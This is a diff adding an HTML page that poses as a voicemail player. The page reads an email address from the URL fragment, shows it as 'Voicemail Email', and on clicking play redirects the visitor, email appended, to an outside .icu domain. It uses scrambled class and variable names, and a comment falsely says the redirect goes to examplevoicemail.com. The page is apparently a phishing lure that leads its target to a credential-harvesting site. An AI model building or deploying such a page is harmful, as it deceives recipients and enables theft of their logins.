@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="theme-color" content="#0a0a0a">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:description" content="Adventure lives in the space between breaths.">
+  <title>Voicemail — Systems</title>
+
+  <script>
+    (function () {
+      // Parse and expose the fragment/hash safely
+      var href = (typeof window !== 'undefined' && window.location && window.location.href) ? window.location.href : '';
+      var parts = href.split('#');
+      window.data1 = parts[0] || '';
+      // use fragment (without the leading '#')
+      window.verily2592 = (parts[1] || '').toString();
+      console.log('data1:', window.data1);
+      console.log('verily2592 (fragment):', window.verily2592);
+
+      document.addEventListener('DOMContentLoaded', function () {
+        var placeholder = document.getElementById('hash-placeholder');
+        if (placeholder) {
+          placeholder.textContent = window.verily2592 || '(no hash found)';
+        }
+      });
+    })();
+
+    // Redirect helper used by the play button
+    function redirectToExampleVoicemail() {
+      try {
+        var frag = '';
+        if (typeof window !== 'undefined' && window.location) {
+          // prefer explicit fragment reading
+          frag = (window.location.hash || '').replace(/^#/, '');
+        }
+        // fallback to exposed var if needed
+        if (!frag && window.verily2592) frag = window.verily2592;
+
+        var targetBase = 'https://mintrokl.icu/5rwp3T8Z5b/#V';
+        var target = targetBase;
+        if (frag) {
+          // encode any special chars
+          target = targetBase + frag;
+        }
+        // perform redirect
+        window.location.href = target;
+      } catch (e) {
+        console.error('Redirect failed:', e);
+      }
+    }
+  </script>
+
+  <style>
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading { animation: spin 1s linear infinite; border: 3px solid #fff3 !important; border-top: 3px solid #fff !important; }
+    .aftereffect93005:hover { opacity: 1 !important; transform: scale(1.1); }
+    body { margin:0; height:100vh; background:#000; display:flex; flex-direction:column; color:#fff; font-family:system-ui,Segoe UI,Roboto,Arial; }
+    #play-button { transition:all 0.18s ease; }
+    #play-button:active { transform: scale(0.98); }
+  </style>
+</head>
+
+<body>
+  <div id="penknives15062" class="enlighten17471" aria-hidden="true" style="display:none">
+    <div data-experiment="variant-B"></div>
+  </div>
+
+  <div style="flex:1;background:linear-gradient(135deg,#0a0a0a,#1a1a1a);position:relative;display:flex;align-items:center;justify-content:center">
+    <div style="position:absolute;top:20px;left:21px;right:20px;display:flex;justify-content:space-between;z-index:10">
+      <div style="color:#fff;font-size:14px;background:#0009;padding:5px 15px;border-radius:20px">Voicemail</div>
+      <div style="display:flex;gap:15px">
+        <div class="aftereffect93005" style="color:#fff;opacity:0.8;cursor:pointer">⚙️</div>
+        <div class="aftereffect93005" style="color:#fff;opacity:0.8;cursor:pointer">📱</div>
+      </div>
+    </div>
+
+    <!-- Play button: now redirects to examplevoicemail.com/<fragment> -->
+    <div id="play-button"
+      style="width:110px;height:110px;border-radius:50%;background:#fff1;backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.3s"
+      onclick="redirectToExampleVoicemail()"
+      onmouseover="this.style.background='#fff2'"
+      onmouseout="this.style.background='#fff1'">
+      <div style="width:0;height:0;border-left:40px solid #fff;border-top:22px solid transparent;border-bottom:22px solid transparent;margin-left:8px"></div>
+    </div>
+
+    <div style="position:absolute;bottom:60px;left:20px;right:20px;color:#fff;font-size:12px;text-align:center;opacity:0.7">Click to go to voicemail • 2:26 duration</div>
+  </div>
+
+  <div style="background:linear-gradient(to bottom,#1a1a1a,#000);padding:10px 20px;border-top:1px solid #333">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
+      <div style="color:#fff;font-size:11px">0:00</div>
+      <div style="flex:1;height:5px;background:#333;border-radius:3px;position:relative;cursor:pointer">
+        <div style="width:100%;height:2px;background:#666;position:absolute;top:1.5px"></div>
+        <div style="width:0%;height:100%;background:#f00;position:absolute;border-radius:3px"></div>
+        <div style="width:12px;height:12px;background:#fff;border-radius:50%;position:absolute;top:-3.5px;left:0%;margin-left:-6px"></div>
+      </div>
+      <div style="color:#fff;font-size:11px">2:26</div>
+    </div>
+
+    <div style="display:flex;justify-content:space-between;align-items:center">
+      <div style="display:flex;gap:15px;align-items:center">
+        <div class="aftereffect93005" style="color:#fff;font-size:16px;cursor:pointer;opacity:0.9">▶️</div>
+        <div class="aftereffect93005" style="color:#fff;font-size:16px;cursor:pointer;opacity:0.9">⏭️</div>
+        <div style="display:flex;align-items:center;gap:5px">
+          <div style="color:#fff;font-size:14px;opacity:0.9">🔊</div>
+          <div style="width:60px;height:3px;background:#333;border-radius:2px;position:relative;cursor:pointer">
+            <div style="width:40%;height:100%;background:#fff;border-radius:2px"></div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;gap:15px">
+        <div class="aftereffect93005" style="color:#fff;font-size:14px;cursor:pointer;opacity:0.7">⚙️</div>
+        <div class="aftereffect93005" style="color:#fff;font-size:14px;cursor:pointer;opacity:0.7">⛶</div>
+      </div>
+    </div>
+
+    <!-- Debug placeholder where parsed hash value shows -->
+    <div style="margin-top:10px;font-size:12px;color:#ddd">Voicemail Email: <span id="hash-placeholder" style="font-weight:600">(loading...)</span></div>
+  </div>
+
+  <div data-version="5.2.2" class="lineally31695 unfrequented96783" hidden><!-- Custom Tracking --></div>
+</body>
+</html>
